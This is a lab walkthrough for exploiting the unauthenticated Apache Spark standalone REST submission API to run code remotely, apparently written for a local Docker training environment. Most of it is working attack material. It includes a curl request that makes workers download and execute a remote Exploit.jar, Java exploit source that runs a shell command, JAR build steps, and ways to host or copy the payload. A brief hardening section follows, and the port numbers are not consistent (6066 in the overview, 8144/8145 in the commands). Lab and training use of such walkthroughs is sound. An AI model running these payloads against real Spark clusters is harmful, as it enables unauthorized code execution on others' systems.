# Apache Spark Standalone Cluster Manager REST API Command Submission RCE

## Overview

Apache Spark is an open-source distributed computing framework. In standalone cluster deployments, Spark enables a REST submission server on port 6066 without authentication by default. Attackers with network reachability can submit a CreateSubmissionRequest containing a remote JAR resource or arbitrary mainClass parameters, forcing worker nodes to download and execute arbitrary Java bytecode as the root/spark system user.

- **Service Access**: `http://localhost:8144/`
- **Default Credentials**: `Unauthenticated API`
- **Docker Shortcut**: `./lab start spark-unauth-rce`
- **Container Name**: `cyberlab_industry_spark_unauth_rce`
- **RAM Footprint**: ~600M

---

## Exploitation Walkthrough

### 1. Inspect Spark Web Dashboard

```bash
curl -i http://localhost:8145/
```

### 2. Submit Malicious Job via REST API

```bash
curl -i -X POST 'http://localhost:8144/v1/submissions/create' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -d '{
    "action": "CreateSubmissionRequest",
    "appArgs": ["id"],
    "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "clientProcessId": "client-2024",
    "environmentVariables": {"SPARK_ENV_LOADED": "1"},
    "mainClass": "Exploit",
    "sparkProperties": {
      "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
      "spark.driver.supervise": "false",
      "spark.app.name": "exploit",
      "spark.eventLog.enabled": "true",
      "spark.submit.deployMode": "cluster",
      "spark.master": "spark://localhost:7077"
    }
  }'
```

> [!NOTE]
> **Spark Master RPC Port**: In `sparkProperties`, `"spark.master"` must point to the Spark Master RPC port `7077` (`spark://localhost:7077` or `spark://cyberlab_industry_spark_unauth_rce:7077`), **not** the REST submission server port `6066`.

### Offline / Local Exploit JAR Option

If testing in an offline or air-gapped lab without external access to GitHub, you can provide the exploit JAR locally:

1. **Compile your own exploit JAR**:

   ```java
   // Exploit.java
   public class Exploit {
       public static void main(String[] args) throws Exception {
           Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "touch /tmp/pwned_spark"});
       }
   }
   ```

   Compile and package into a JAR:

   ```bash
   javac Exploit.java
   jar -cvfe Exploit.jar Exploit Exploit.class
   ```

2. **Option A — Host via Local HTTP Server**:
   Start a local Python HTTP server on your machine:

   ```bash
   python3 -m http.server 8000
   ```

   Set `"appResource"` and `"spark.jars"` in the submission to `http://<host-ip>:8000/Exploit.jar`.

3. **Option B — Direct Local File Mount or Copy**:
   Copy the JAR into the running Spark container:
   ```bash
   docker cp Exploit.jar cyberlab_industry_spark_unauth_rce:/tmp/Exploit.jar
   ```
   Then reference the local file URI in the submission:
   ```json
   "appResource": "file:///tmp/Exploit.jar",
   "sparkProperties": {
     "spark.jars": "file:///tmp/Exploit.jar",
     "spark.master": "spark://localhost:7077",
     ...
   }
   ```

### 3. Verify Worker Execution

```bash
docker exec -it cyberlab_industry_spark_unauth_rce ps aux
```

---

## Defensive Remediation & Hardening

1. Disable spark.master.rest.enabled if external submission is not required.
2. Enable spark.authenticate and SSL encryption across cluster nodes.
3. Isolate Spark master port 6066 to private VPC clusters.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Apache Spark Security Guide](https://spark.apache.org/docs/latest/security.html)
- [Vulhub Spark REST Environment](https://vulhub.org/#/environments/spark/unacc/)
